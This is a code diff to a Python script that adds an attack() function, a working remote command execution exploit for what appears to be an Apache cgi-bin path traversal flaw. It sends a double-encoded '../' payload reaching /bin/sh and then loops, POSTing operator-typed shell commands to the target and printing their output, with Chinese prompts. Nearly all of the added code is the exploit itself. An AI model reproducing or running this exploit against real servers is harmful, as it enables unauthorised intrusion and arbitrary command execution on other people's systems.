@@ -1,6 +1,7 @@
 import requests
 import re
 import urllib
+from urllib import request
 import time
 import socket
 from urllib.parse import urlparse
@@ -50,4 +51,22 @@ Content-Length: 51
     except:
         return relsult
 
+def attack(url):
+    try:
+        payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
+        vurl = urllib.parse.urljoin(url, payload)
+        post_data = 'echo;{0}'
+        cmd = ''
+        print('[+] 开始执行命令, 输入exit退出!')
+        while cmd != 'exit':
+            post_data = 'echo;{0}'
+            cmd = str(input('[+] 执行命令:'))
+            post_data = bytes(post_data.format(cmd), 'utf-8')
+            with request.urlopen(vurl, data=post_data) as response:
+                data = response.read()
+                print('[*] 执行结果:')
+                print(data.decode('utf-8'))
+        return True
+    except:
+        return False
 
